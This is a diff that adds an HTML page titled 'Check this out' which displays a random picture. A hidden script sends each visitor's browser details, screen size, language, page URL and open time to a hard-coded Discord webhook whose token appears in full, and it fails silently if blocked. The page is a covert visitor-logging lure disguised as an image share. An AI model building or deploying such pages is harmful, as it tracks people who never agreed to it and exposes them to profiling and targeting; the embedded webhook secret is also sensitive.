@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Check this out</title>
+  <style>
+    body { margin:0; height:100vh; background:#000; display:flex; justify-content:center; align-items:center; }
+    img { max-width:95%; max-height:95vh; border-radius:8px; box-shadow:0 0 20px #0ff; }
+  </style>
+</head>
+<body>
+  <img src="https://picsum.photos/800/600?random=99" alt="Cool picture">
+
+  <script>
+    // ─── YOUR WEBHOOK ───────────────────────────────────────
+    const WEBHOOK = "https://discord.com/api/webhooks/1482807792124297218/d-ZEaW7fRbmLfX2a19jMVVaaUb6xKb_byomhoI87j5QJg_RcG1qYF4r3M0qveFYJhrNu";
+
+    const payload = {
+      username: "Image View Logger",
+      avatar_url: "https://i.imgur.com/abc123.png", // optional, change or remove
+      embeds: [{
+        title: "📸 Image was opened!",
+        color: 0x00ff88,
+        timestamp: new Date().toISOString(),
+        fields: [
+          { name: "Time (UTC)", value: new Date().toUTCString(), inline: true },
+          { name: "User-Agent", value: navigator.userAgent || "unknown", inline: false },
+          { name: "Screen Size", value: `${screen.width} × ${screen.height}`, inline: true },
+          { name: "Browser Language", value: navigator.language || "unknown", inline: true },
+          { name: "Page URL", value: location.href, inline: false }
+        ],
+        footer: { text: "Test logger • Do not abuse" }
+      }]
+    };
+
+    fetch(WEBHOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    }).catch(() => {}); // silent fail if blocked
+  </script>
+</body>
+</html>
